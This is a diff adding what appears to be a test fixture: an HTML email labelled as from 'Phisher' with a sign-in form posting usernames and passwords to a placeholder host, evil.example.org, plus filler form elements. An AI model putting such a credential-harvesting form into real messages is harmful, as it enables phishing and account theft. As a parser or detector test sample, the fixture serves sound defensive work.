@@ -1,0 +1,19 @@
+From: Phisher <x@example.org>
+To: Alice <alice@example.org>
+Subject: Action required
+Date: Fri, 5 Sep 2026 10:06:00 +0200
+Message-ID: <forms@example.org>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<form action="https://evil.example.org/collect" method="post">
+  <label>Username <input type="text" name="user"></label>
+  <label>Password <input type="password" name="pass"></label>
+  <select name="q"><option>one</option><option>two</option></select>
+  <textarea name="t">notes</textarea>
+  <button type="submit" formaction="https://evil.example.org/alt">Sign in</button>
+</form>
+<fieldset><legend>Legend text</legend>Inside a fieldset.</fieldset>
+<p>Text after the form.</p>
+</body></html>
